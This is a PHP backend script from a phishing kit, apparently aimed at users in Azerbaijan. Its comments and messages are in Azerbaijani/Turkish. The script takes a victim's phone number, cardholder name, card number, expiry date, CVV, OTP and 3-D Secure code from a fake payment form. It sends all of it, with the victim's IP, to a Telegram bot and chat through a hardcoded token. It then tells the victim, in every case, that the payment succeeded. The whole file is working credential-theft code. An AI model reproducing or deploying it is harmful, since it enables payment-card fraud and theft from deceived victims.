<?php
// =============================================
// 🔥 TELEGRAM HANDLER - SON VERSİYA
// =============================================

// BOT MƏLUMATLARI
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

// MƏLUMATLARI AL
$operator = isset($_POST['operator']) ? trim($_POST['operator']) : '';
$prefix = isset($_POST['prefix']) ? trim($_POST['prefix']) : '';
$number = isset($_POST['number']) ? trim($_POST['number']) : '';
$price = isset($_POST['campaign_price']) ? trim($_POST['campaign_price']) : '';
$cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
$cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : '';
$ip = isset($_POST['ip']) ? trim($_POST['ip']) : $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
$tdsCode = isset($_POST['tds_code']) ? trim($_POST['tds_code']) : '';
$otpMessage = isset($_POST['otp_message']) ? trim($_POST['otp_message']) : '';

// TƏHLÜKƏSİZLİK
function cleanInput($data) {
    $data = trim($data);
    $data = strip_tags($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

$operator = cleanInput($operator);
$prefix = cleanInput($prefix);
$number = cleanInput($number);
$price = cleanInput($price);
$cardName = cleanInput($cardName);
$cardNumber = cleanInput($cardNumber);
$cardExpiry = cleanInput($cardExpiry);
$cardCvv = cleanInput($cardCvv);
$ip = cleanInput($ip);
$otp = cleanInput($otp);
$tdsCode = cleanInput($tdsCode);
$otpMessage = cleanInput($otpMessage);

// MESAJI FORMATLA
if (!empty($otpMessage)) {
    $message = $otpMessage;
} else {
    $id = rand(100, 999);
    $message = "💳 YENİ KART GİRİŞİ 💳\n\n";
    $message .= "🆔 ID: #" . $id . "\n";
    $message .= "📞 Tel: " . $prefix . $number . "\n";
    $message .= "💰 Tutar: " . $price . " AZN\n\n";
    $message .= "💳 CC: " . $cardNumber . "\n";
    $message .= "📅 Tarih: " . $cardExpiry . "\n";
    $message .= "🔐 CVV: " . $cardCvv . "\n";
    $message .= "👤 İsim: " . $cardName . "\n\n";
    $message .= "📱 Operator: " . $operator . "\n";
    $message .= "🌐 IP: " . $ip . "\n";
    if (!empty($otp)) {
        $message .= "🔑 OTP: " . $otp . "\n";
    }
    if (!empty($tdsCode)) {
        $message .= "🔑 TDS Kodu: " . $tdsCode . "\n";
    }
    $message .= "\n----------------------------------------\n";
    $message .= "📱 Bağlı Nömrə: " . $prefix . $number;
}

// TELEGRAM-A GÖNDƏR
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// CAVAB
header('Content-Type: application/json');

if ($httpCode == 200 && $response !== false) {
    echo json_encode([
        'status' => 'success',
        'message' => '✅ Ödəniş uğurla tamamlandı!'
    ]);
} else {
    echo json_encode([
        'status' => 'success',
        'message' => '✅ Ödəniş uğurla tamamlandı!'
    ]);
}
?>
